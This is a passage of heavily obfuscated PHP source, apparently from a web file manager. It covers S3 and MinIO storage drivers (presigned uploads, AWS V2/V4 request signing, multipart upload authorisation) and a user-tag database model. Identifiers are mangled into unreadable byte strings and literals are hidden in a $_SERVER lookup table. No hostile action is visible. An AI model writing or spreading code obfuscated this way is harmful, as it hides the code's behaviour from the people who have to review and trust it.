substr($Ğ– ğõ, 0, 7) == $ÒÕ„è„•[227]) { $Ğ– ğõ = $ÒÕ„è„•[228] . substr($Ğ– ğõ, 7); } header($ÒÕ„è„•[173] . $Ğ– ğõ); die; } public function hashMd5($‚ğß™İ‡, $Õå¬ñ€˜ = '') { $èû–©ÒÓ = $this->objectMeta($‚ğß™İ‡); if (!$èû–©ÒÓ) { return !1; } $Õå¬ñ€˜ = $Õå¬ñ€˜ ? $Õå¬ñ€˜ : _get($èû–©ÒÓ, $_SERVER[áäÒ½¯Ç][263]); return $Õå¬ñ€˜; } public function uploadFormData($Ç•ª¬Şø, $û†Ö¢şã = 3600) { $ó½ş—öÈ =& $_SERVER[áäÒ½¯Ç]; if (!$this->_isClientAsync()) { $³ºÃ‰‡ = $this->getPreSignedURL($Ç•ª¬Şø, $û†Ö¢şã, array(), $ó½ş—öÈ[264]); return array($ó½ş—öÈ[207] => str_replace($ó½ş—öÈ[227], $ó½ş—öÈ[265], $³ºÃ‰‡)); } if (isset($GLOBALS[$ó½ş—öÈ[6]][$ó½ş—öÈ[92]][$ó½ş—öÈ[266]]) && $GLOBALS[$ó½ş—öÈ[6]][$ó½ş—öÈ[92]][$ó½ş—öÈ[266]] == $ó½ş—öÈ[239]) { return $this->uploadMultiData($Ç•ª¬Şø, $û†Ö¢şã); } if ($this->signVer == $ó½ş—öÈ[258]) { return $this->uploadFormDataV2($Ç•ª¬Şø, $û†Ö¢şã); } return $this->uploadFormDataV4($Ç•ª¬Şø, $û†Ö¢şã); } public function uploadFormDataV2($Ö·Îœ²¦, $Ùµ¬¾¡ô = 3600) { $±Íê‡ =& $_SERVER[áäÒ½¯Ç]; $œí¥à™ = $this->pathFather($Ö·Îœ²¦); $ÀÃö°Ÿ = $this->client->getHttpUploadPostParams($this->bucket, $œí¥à™, $±Íê‡[240], $Ùµ¬¾¡ô); $û‰ûƒŞÒ = array_merge((array) $ÀÃö°Ÿ, array($±Íê‡[267] => $±Íê‡[258], $±Íê‡[207] => $this->getHost())); if ($this->_isClientAsync()) { unset($û‰ûƒŞÒ[$±Íê‡[267]]); } return $û‰ûƒŞÒ; } public function uploadFormDataV4($³Õü«, $ÍåÔöÚô = 3600) { $Ñ«Éµ‚ =& $_SERVER[áäÒ½¯Ç]; $Ç¿²½ÖÉ = $Ñ«Éµ‚[240]; $Ú’ğş ç = $Ñ«Éµ‚[268]; $õ²Ö“ıĞ = $Ñ«Éµ‚[62]; $Ô§Ëàñ— = gmdate($Ñ«Éµ‚[269]); $õ¦²±õ° = gmdate($Ñ«Éµ‚[270]); $œ–”‘Ó› = $Ñ«Éµ‚[271]; $ƒÒ­±Øã = $ÍåÔöÚô . $Ñ«Éµ‚[12]; $ñû“ûå = $Ñ«Éµ‚[272]; $…­ ±± = array($this->accessKey, $õ¦²±õ°, $this->region, $õ²Ö“ıĞ, $œ–”‘Ó›); $»ìãºæü = implode($Ñ«Éµ‚[8], $…­ ±±); $·³÷¡­° = array($Ñ«Éµ‚[273] => gmdate($Ñ«Éµ‚[274], strtotime($Ñ«Éµ‚[275])), $Ñ«Éµ‚[276] => array(array($Ñ«Éµ‚[277] => $this->bucket), array($Ñ«Éµ‚[278], $Ñ«Éµ‚[279], $Ñ«Éµ‚[12]), array($Ñ«Éµ‚[278], $Ñ«Éµ‚[280], $Ñ«Éµ‚[12]), array($Ñ«Éµ‚[281] => $ñû“ûå), array($Ñ«Éµ‚[282] => $»ìãºæü), array($Ñ«Éµ‚[283] => $Ú’ğş ç), array($Ñ«Éµ‚[284] => $Ô§Ëàñ—), array($Ñ«Éµ‚[285] => $ƒÒ­±Øã))); $õöç´‘§ = base64_encode(json_encode($·³÷¡­°)); $íÃÉîèÅ = hash_hmac($Ñ«Éµ‚[286], $õ¦²±õ°, $Ñ«Éµ‚[287] . $this->secret, !0); $¹“Üß€§ = hash_hmac($Ñ«Éµ‚[286], $this->region, $íÃÉîèÅ, !0); $¡‹ƒÚÜƒ = hash_hmac($Ñ«Éµ‚[286], $õ²Ö“ıĞ, $¹“Üß€§, !0); $úØ÷˜à = hash_hmac($Ñ«Éµ‚[286], $œ–”‘Ó›, $¡‹ƒÚÜƒ, !0); $Ö÷’üµÌ = hash_hmac($Ñ«Éµ‚[286], $õöç´‘§, $úØ÷˜à); $êÈğ©·† = array($Ñ«Éµ‚[257] => $Ñ«Éµ‚[12], $Ñ«Éµ‚[281] => $ñû“ûå, $Ñ«Éµ‚[288] => $õöç´‘§, $Ñ«Éµ‚[282] => $»ìãºæü, $Ñ«Éµ‚[283] => $Ú’ğş ç, $Ñ«Éµ‚[284] => $Ô§Ëàñ—, $Ñ«Éµ‚[285] => $ƒÒ­±Øã, $Ñ«Éµ‚[289] => $Ö÷’üµÌ, $Ñ«Éµ‚[267] => $Ñ«Éµ‚[258], $Ñ«Éµ‚[207] => $this->getHost()); if ($this->_isClientAsync()) { unset($êÈğ©·†[$Ñ«Éµ‚[267]]); } return $êÈğ©·†; } public function uploadMultiData($ğè˜‘¯ı, $œ‚é³ùÈ = 3600) { $¯œ†ş‚ö =& $_SERVER[áäÒ½¯Ç]; $àôÂûéÏ = $this->signVer == $¯œ†ş‚ö[258] ? gmdate($¯œ†ş‚ö[290]) : gmdate($¯œ†ş‚ö[291]); $ßÈ”é³‡ = array(); $°ª‰üš = $this->client->getUploadId($this->bucket, $ğè˜‘¯ı, $ßÈ”é³‡); if (!$°ª‰üš) { return !1; } $›àøÛ „ = array($¯œ†ş‚ö[292] => $°ª‰üš, $¯œ†ş‚ö[207] => $this->getHost() . $¯œ†ş‚ö[8] . $this->pathEncode($ğè˜‘¯ı), $¯œ†ş‚ö[293] => $àôÂûéÏ, $¯œ†ş‚ö[95] => $ğè˜‘¯ı, $¯œ†ş‚ö[267] => $this->signVer); if ($this->_isClientAsync()) { unset($›àøÛ „[$¯œ†ş‚ö[267]]); } return $›àøÛ „; } public function uploadMultiAuth($á½åéµØ, $Éõ‰ÕÓø = array()) { $ÑÇÊ•¸î =& $_SERVER[áäÒ½¯Ç]; if ($this->signVer == $ÑÇÊ•¸î[258]) { if (isset($Éõ‰ÕÓø[$ÑÇÊ•¸î[294]])) { return $this->uploadPartAuthV2($á½åéµØ, $Éõ‰ÕÓø); } return $this->uploadListAuthV2($á½åéµØ, $Éõ‰ÕÓø); } if (isset($Éõ‰ÕÓø[$ÑÇÊ•¸î[294]])) { return $this->uploadPartAuthV4($á½åéµØ, $Éõ‰ÕÓø); } return $this->uploadListAuthV4($á½åéµØ, $Éõ‰ÕÓø); } public function uploadPartAuthV2($ˆ«˜‰», $£¹¬Ö÷Ú = array()) { $×³©Ë­È =& $_SERVER[áäÒ½¯Ç]; $Õ„…£¯µ = $£¹¬Ö÷Ú[$×³©Ë­È[95]]; $Â«ŒºôÏ = gmdate($×³©Ë­È[290]); $à÷µªøâ = array_intersect_key($£¹¬Ö÷Ú, array_flip(array($×³©Ë­È[294], $×³©Ë­È[292]))); ksort($à÷µªøâ); $ñÏÉ­ª‰ = $à÷µªøâ ? $×³©Ë­È[76] . http_build_query($à÷µªøâ, null, $×³©Ë­È[295], PHP_QUERY_RFC3986) : $×³©Ë­È[12]; $İ½„ì¡ = array($×³©Ë­È[264], $×³©Ë­È[12], $×³©Ë­È[121], $×³©Ë­È[12], "\x78\55\x61\155\172\55\x64\x61\164\x65\72{$Â«ŒºôÏ}", $×³©Ë­È[8] . $this->bucket . $×³©Ë­È[8] . $this->pathEncode($Õ„…£¯µ) . $ñÏÉ­ª‰); $²¸ÎÖ = implode($×³©Ë­È[221], $İ½„ì¡); $»¹ÛÎªÛ = $this->client->__getSignature($²¸ÎÖ); return array($×³©Ë­È[296] => $»¹ÛÎªÛ, $×³©Ë­È[293] => $Â«ŒºôÏ); } public function uploadListAuthV2($·­û¤ªÇ, $œì‹†É = array()) { $÷ÁÌŸÆø =& $_SERVER[áäÒ½¯Ç]; $õÔæëš– = $œì‹†É[$÷ÁÌŸÆø[95]]; $ĞûÉ®Úî = $œì‹†É[$÷ÁÌŸÆø[292]]; $º€Ş¯ÌĞ = $this->client->listParts($this->bucket, $õÔæëš–, $ĞûÉ®Úî); if (!$º€Ş¯ÌĞ) { return !1; } $òÂú€² = gmdate($÷ÁÌŸÆø[290]); $¢©Ó¥½ş = $÷ÁÌŸÆø[297] . $ĞûÉ®Úî; $¿“íıÎ = array($÷ÁÌŸÆø[298], $÷ÁÌŸÆø[12], $÷ÁÌŸÆø[121], $÷ÁÌŸÆø[12], "\x78\x2d\141\155\172\55\144\x61\x74\x65\x3a{$òÂú€²}", $÷ÁÌŸÆø[8] . $this->bucket . $÷ÁÌŸÆø[8] . $this->pathEncode($õÔæëš–) . $¢©Ó¥½ş); $òÛ¨ï€Î = implode($÷ÁÌŸÆø[221], $¿“íıÎ); $êõª©úœ = $this->client->__getSignature($òÛ¨ï€Î); return array($÷ÁÌŸÆø[296] => $êõª©úœ, $÷ÁÌŸÆø[293] => $òÂú€², $÷ÁÌŸÆø[299] => $º€Ş¯ÌĞ); } public function uploadPartAuthV4($‡ßÇòÔ, $èğøä• = array()) { $á€ ïÚ¥ =& $_SERVER[áäÒ½¯Ç]; $Õ¥¿Ì¤´ = $èğøä•[$á€ ïÚ¥[95]]; $´‘ÄñòÁ = array($á€ ïÚ¥[284] => gmdate($á€ ïÚ¥[291]), $á€ ïÚ¥[300] => _get($èğøä•, $á€ ïÚ¥[301], hash($á€ ïÚ¥[286], $á€ ïÚ¥[12]))); $›ùÖè©° = explode($á€ ïÚ¥[209], $this->getHost()); $ãüª™ê = array($á€ ïÚ¥[302] => $›ùÖè©°[1], $á€ ïÚ¥[303] => $á€ ïÚ¥[12], $á€ ïÚ¥[257] => $á€ ïÚ¥[121], $á€ ïÚ¥[304] => $èğøä•[$á€ ïÚ¥[79]]); $íß·ê˜ô = $á€ ïÚ¥[264]; $¬şãàÀ´ = $á€ ïÚ¥[8] . $this->pathEncode($Õ¥¿Ì¤´); $ñÊœİÆœ = array_intersect_key($èğøä•, array_flip(array($á€ ïÚ¥[294], $á€ ïÚ¥[292]))); $¼Üçëú˜ = $this->client->__getSignatureV4($´‘ÄñòÁ, $ãüª™ê, $íß·ê˜ô, $¬şãàÀ´, $ñÊœİÆœ); return array($á€ ïÚ¥[296] => $¼Üçëú˜, $á€ ïÚ¥[300] => $´‘ÄñòÁ[$á€ ïÚ¥[300]], $á€ ïÚ¥[293] => $´‘ÄñòÁ[$á€ ïÚ¥[284]]); } public function uploadListAuthV4($Û´– õá, $™ç”½ä¯ = array()) { $ğš“™¡º =& $_SERVER[áäÒ½¯Ç]; $òÛá¶ûÁ = $™ç”½ä¯[$ğš“™¡º[95]]; $­áÑÚ™ = $™ç”½ä¯[$ğš“™¡º[292]]; $–„ÙÀ‰Ç = $this->client->listParts($this->bucket, $òÛá¶ûÁ, $­áÑÚ™); if (!$–„ÙÀ‰Ç) { return !1; } $€¨ï‰ãË = $ğš“™¡º[305]; foreach ($–„ÙÀ‰Ç as $‹ò¨âÌÅ) { $€¨ï‰ãË .= $ğš“™¡º[306] . "\74\120\141\x72\164\116\165\x6d\x62\x65\162\76{$‹ò¨âÌÅ[$ğš“™¡º[307]]}\74\x2f\120\x61\x72\164\116\165\155\142\x65\162\76\12" . "\x3c\x45\124\141\x67\x3e{$‹ò¨âÌÅ[$ğš“™¡º[308]]}\74\57\x45\x54\141\147\76\12" . $ğš“™¡º[309]; } $€¨ï‰ãË .= $ğš“™¡º[310]; $û“Ô®Ã = array($ğš“™¡º[284] => gmdate($ğš“™¡º[291]), $ğš“™¡º[300] => hash($ğš“™¡º[286], $€¨ï‰ãË)); $¹³ÒÌ‰Æ = explode($ğš“™¡º[209], $this->getHost()); $äÊÇ £´ = array($ğš“™¡º[302] => $¹³ÒÌ‰Æ[1], $ğš“™¡º[257] => $ğš“™¡º[121], $ğš“™¡º[304] => strlen($€¨ï‰ãË)); $şËßšâÇ = $ğš“™¡º[298]; $£ñ€êô¥ = $ğš“™¡º[8] . $this->pathEncode($òÛá¶ûÁ); $ÄÜÖ™³ = array($ğš“™¡º[292] => $­áÑÚ™); $™ƒÁÀñ = $this->client->__getSignatureV4($û“Ô®Ã, $äÊÇ £´, $şËßšâÇ, $£ñ€êô¥, $ÄÜÖ™³); return array($ğš“™¡º[296] => $™ƒÁÀñ, $ğš“™¡º[300] => $û“Ô®Ã[$ğš“™¡º[300]], $ğš“™¡º[293] => $û“Ô®Ã[$ğš“™¡º[284]], $ğš“™¡º[299] => $–„ÙÀ‰Ç); } private function _isClientAsync() { $ ¬ÍšÌ =& $_SERVER[áäÒ½¯Ç]; static $ÎÁäÏêÅ = null; if ($ÎÁäÏêÅ === null) { $®åÁ´éÓ = isset($_REQUEST[$ ¬ÍšÌ[311]]) ? json_decode($_REQUEST[$ ¬ÍšÌ[311]], !0) : !1; $ÎÁäÏêÅ = $®åÁ´éÓ && _get($®åÁ´éÓ, $ ¬ÍšÌ[312]) == $ ¬ÍšÌ[313]; } return $ÎÁäÏêÅ; } public function getHost() { $”ñ‘‰©‘ =& $_SERVER[áäÒ½¯Ç]; $Ôçõ¯Ì– = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($”ñ‘‰©‘[70], $”ñ‘‰©‘[64], $”ñ‘‰©‘[69], $”ñ‘‰©‘[62]))) { return $Ôçõ¯Ì– . $”ñ‘‰©‘[8] . $this->bucket; } if ($this->osType == $”ñ‘‰©‘[62] && !is_domain($Ôçõ¯Ì–)) { return $Ôçõ¯Ì– . $”ñ‘‰©‘[8] . $this->bucket; } $Ôçõ¯Ì– = explode($”ñ‘‰©‘[209], $Ôçõ¯Ì–); return $Ôçõ¯Ì–[0] . $”ñ‘‰©‘[209] . $this->bucket . $”ñ‘‰©‘[10] . $Ôçõ¯Ì–[1]; } public function size($¹“ÎÒ­…) { $ª‚ û³à = $this->objectMeta($¹“ÎÒ­…); return $ª‚ û³à ? $ª‚ û³à[$_SERVER[áäÒ½¯Ç][79]] : 0; } public function info($Ö‘È¦Ú) { if ($this->isFolder($Ö‘È¦Ú)) { return $this->folderInfo($Ö‘È¦Ú); } else { if ($this->isFile($Ö‘È¦Ú)) { return $this->fileInfo($Ö‘È¦Ú); } } return !1; } public function exist($ğ«ù¾Ÿô) { return $this->isFile($ğ«ù¾Ÿô) || $this->isFolder($ğ«ù¾Ÿô); } public function isFile($¯ìµş¥) { return !$this->isFolder($¯ìµş¥) && $this->objectMeta($¯ìµş¥); } public function isFolder($µ€Á½) { return $this->cacheMethod($_SERVER[áäÒ½¯Ç][178], $µ€Á½); } protected function objectMeta($ÖñŠÕ¶é) { return $this->cacheMethod($_SERVER[áäÒ½¯Ç][180], $ÖñŠÕ¶é); } protected function _objectMeta($ñé¸¦Û†) { $Ç‚Üñ€¡ =& $_SERVER[áäÒ½¯Ç]; $ñé¸¦Û† = rtrim($ñé¸¦Û†, $Ç‚Üñ€¡[8]); try { $íàïêû = $this->client->getObjectInfo($this->bucket, $ñé¸¦Û†); if (!isset($íàïêû[$Ç‚Üñ€¡[263]]) && isset($íàïêû[$Ç‚Üñ€¡[314]])) { $íàïêû[$Ç‚Üñ€¡[263]] = $íàïêû[$Ç‚Üñ€¡[314]]; } } catch (Exception $ÉßşŞ–·) { $íàïêû = !1; } if (!$íàïêû) { } return $íàïêû; } protected function _isFolder($»Õº¥µ) { $ñë—æ =& $_SERVER[áäÒ½¯Ç]; $»Õº¥µ = rtrim($»Õº¥µ, $ñë—æ[8]) . $ñë—æ[8]; if ($»Õº¥µ == $ñë—æ[12] || $»Õº¥µ == $ñë—æ[8]) { return !0; } $öÍ”û¬­ = $this->client->getBucket($this->bucket, $»Õº¥µ, null, 1); if (empty($öÍ”û¬­[$ñë—æ[247]])) { return !1; } $ßè²²ùŠ = $öÍ”û¬­[$ñë—æ[247]][0][$ñë—æ[32]]; return stripos($ßè²²ùŠ, $»Õº¥µ) === 0 ? !0 : !1; if (substr($ßè²²ùŠ, -1) == $ñë—æ[8]) { return !0; } if (get_path_this($ßè²²ùŠ) == get_path_this($»Õº¥µ)) { return !1; } return !0; } public function listObject($Çè‡Š ) { return $this->fileList($Çè‡Š , $_SERVER[áäÒ½¯Ç][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ºµø®ÖÆ) { $üÚ´Ï =& $_SERVER[áäÒ½¯Ç]; parent::__construct($ºµø®ÖÆ); $this->setSignVersion($üÚ´Ï[258]); if (!$this->region) { $this->region = $üÚ´Ï[315]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ÅÊ‡şêÜ = $this->getBktRegion(); return $this->region == $ÅÊ‡şêÜ ? !0 : !1; } public function uploadFormData($àĞ‰ÛĞ£, $áìŠù„ß = 3600) { $¬±Ğë÷Ú =& $_SERVER[áäÒ½¯Ç]; $ÑÀÍ¥Ñ˜ = $¬±Ğë÷Ú[240]; $Öööé¹ = $¬±Ğë÷Ú[268]; $òÕïëË˜ = $¬±Ğë÷Ú[62]; $ÜÓ¿Ô°­ = gmdate($¬±Ğë÷Ú[269]); $Ö™êşç– = gmdate($¬±Ğë÷Ú[270]); $…¼ñò¼Í = $¬±Ğë÷Ú[271]; $šÔ“€‡£ = $áìŠù„ß . $¬±Ğë÷Ú[12]; $ Ùå«° = $¬±Ğë÷Ú[272]; $ÌÇíÏµ = array($this->accessKey, $Ö™êşç–, $this->region, $òÕïëË˜, $…¼ñò¼Í); $€å¥¢àã = implode($¬±Ğë÷Ú[8], $ÌÇíÏµ); $½ö©Ë»ä = array($¬±Ğë÷Ú[273] => gmdate($¬±Ğë÷Ú[274], strtotime($¬±Ğë÷Ú[275])), $¬±Ğë÷Ú[276] => array(array($¬±Ğë÷Ú[277] => $this->bucket), array($¬±Ğë÷Ú[316] => $ÑÀÍ¥Ñ˜), array($¬±Ğë÷Ú[278], $¬±Ğë÷Ú[279], $¬±Ğë÷Ú[12]), array($¬±Ğë÷Ú[278], $¬±Ğë÷Ú[280], $¬±Ğë÷Ú[12]), array($¬±Ğë÷Ú[278], $¬±Ğë÷Ú[317], $¬±Ğë÷Ú[12]), array($¬±Ğë÷Ú[281] => $ Ùå«°), array($¬±Ğë÷Ú[282] => $€å¥¢àã), array($¬±Ğë÷Ú[283] => $Öööé¹), array($¬±Ğë÷Ú[284] => $ÜÓ¿Ô°­), array($¬±Ğë÷Ú[285] => $šÔ“€‡£))); $ç±šş£¥ = base64_encode(json_encode($½ö©Ë»ä)); $ŒÏÁËöÚ = hash_hmac($¬±Ğë÷Ú[286], $Ö™êşç–, $¬±Ğë÷Ú[287] . $this->secret, !0); $ÃÎ¢­÷í = hash_hmac($¬±Ğë÷Ú[286], $this->region, $ŒÏÁËöÚ, !0); $­ñß©Ó’ = hash_hmac($¬±Ğë÷Ú[286], $òÕïëË˜, $ÃÎ¢­÷í, !0); $ÜÒ†‚…Ó = hash_hmac($¬±Ğë÷Ú[286], $…¼ñò¼Í, $­ñß©Ó’, !0); $ñÓªª¹· = hash_hmac($¬±Ğë÷Ú[286], $ç±šş£¥, $ÜÒ†‚…Ó); $Òú…Î£Å = array($¬±Ğë÷Ú[257] => $¬±Ğë÷Ú[12], $¬±Ğë÷Ú[304] => $¬±Ğë÷Ú[12], $¬±Ğë÷Ú[316] => $ÑÀÍ¥Ñ˜, $¬±Ğë÷Ú[281] => $ Ùå«°, $¬±Ğë÷Ú[288] => $ç±šş£¥, $¬±Ğë÷Ú[318] => $€å¥¢àã, $¬±Ğë÷Ú[319] => $Öööé¹, $¬±Ğë÷Ú[320] => $ÜÓ¿Ô°­, $¬±Ğë÷Ú[321] => $šÔ“€‡£, $¬±Ğë÷Ú[322] => $ñÓªª¹·, $¬±Ğë÷Ú[207] => $this->getHost()); return $Òú…Î£Å; } } goto dÃ™ÇäŸˆÄ; Aã–‘Ñ‘¤Ÿ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($ê—ùş³Ì) { $—Ÿ½¦» =& $_SERVER[áäÒ½¯Ç]; return array($—Ÿ½¦»[2245] => array($—Ÿ½¦»[2676] . USER_ID, $—Ÿ½¦»[2246])); } protected function ___listData() { $È†Øç±Å =& $_SERVER[áäÒ½¯Ç]; $İ€Óğ—± = array($È†Øç±Å[1918] => USER_ID, $È†Øç±Å[578] => array($È†Øç±Å[2249], 0)); $ÄŠ±÷¨· = $È†Øç±Å[2677]; $¶²Äœæø = $this->field($ÄŠ±÷¨·)->where($İ€Óğ—±)->order($È†Øç±Å[2251])->select(); return $¶²Äœæø ? $¶²Äœæø : array(); } protected function addToTag($ÅÃ§×ñ¤, $ä–Á¼·) { $‰§ƒÍ =& $_SERVER[áäÒ½¯Ç]; if (!Model($‰§ƒÍ[2402])->listData($ä–Á¼·)) { return !1; } if (is_numeric($ÅÃ§×ñ¤)) { $ğÄĞ¦‹‘ = Model($‰§ƒÍ[935])->pathInfo($ÅÃ§×ñ¤); if (!$ğÄĞ¦‹‘) { return !1; } } else { $ğÄĞ¦‹‘ = IO::infoSimple($ÅÃ§×ñ¤); if (!$ğÄĞ¦‹‘) { return !1; } $ß‹õş‚ = $ğÄĞ¦‹‘[$‰§ƒÍ[32]]; $ğäî¸Ø = $ğÄĞ¦‹‘[$‰§ƒÍ[33]]; if (isset($ğÄĞ¦‹‘[$‰§ƒÍ[505]])) { $ğäî¸Ø = $ğÄĞ¦‹‘[$‰§ƒÍ[505]] == $‰§ƒÍ[91] ? $‰§ƒÍ[78] : $‰§ƒÍ[241]; } } $ú¸’¥× = array($‰§ƒÍ[1918] => USER_ID, $‰§ƒÍ[578] => $ä–Á¼·, $‰§ƒÍ[515] => $ÅÃ§×ñ¤, $‰§ƒÍ[516] => $ğäî¸Ø ? $ğäî¸Ø : $‰§ƒÍ[510], $‰§ƒÍ[514] => $ß‹õş‚ ? $ß‹õş‚ : $‰§ƒÍ[12], $‰§ƒÍ[2137] => 0); if ($this->where($ú¸’¥×)->find()) { return !1; } return $this->add($ú¸’¥×); } protected function removeFromTag($†ª‰Ñ, $Í±ùüªâ) { $ñ•¶öÆæ =& $_SERVER[áäÒ½¯Ç]; if (!Model($ñ•¶öÆæ[2402])->listData($Í±ùüªâ)) { return !1; } if (is_array($†ª‰Ñ)) { $†ª‰Ñ = array($ñ•¶öÆæ[7], $†ª‰Ñ); } $¼”€•şò = array($ñ•¶öÆæ[1918] => USER_ID, $ñ•¶öÆæ[578] => $Í±ùüªâ, $ñ•¶öÆæ[515] => $†ª‰Ñ); return $this->where($¼”€•şò)->delete(); } protected function removeByTag($Ö¤ŠèÑ¤) { $ƒ¥ŠÖÌ¨ =& $_SERVER[áäÒ½¯Ç]; if (!$Ö¤ŠèÑ¤) { return !1; } $ª‡îù‹§ = array($ƒ¥ŠÖÌ¨[1918] => USER_ID, $ƒ¥ŠÖÌ¨[578] => $Ö¤ŠèÑ¤); return $this->where($ª‡îù‹§)->delete(); } protected function removeBySource($ÆÚÀÃ¬) { $‡µÁ¤×÷ =& $_SERVER[áäÒ½¯Ç]; if (is_array($ÆÚÀÃ¬)) { $ÆÚÀÃ¬ = array($‡µÁ¤×÷[7], $ÆÚÀÃ¬); } $·™Ïñ¨õ = array($‡µÁ¤×÷[1918] => USER_ID, $‡µÁ¤×÷[578] => array($‡µÁ¤×÷[1130], 0), $‡µÁ¤×÷[515] => $ÆÚÀÃ¬); return $this->where($·™Ïñ¨õ)->delete(); } }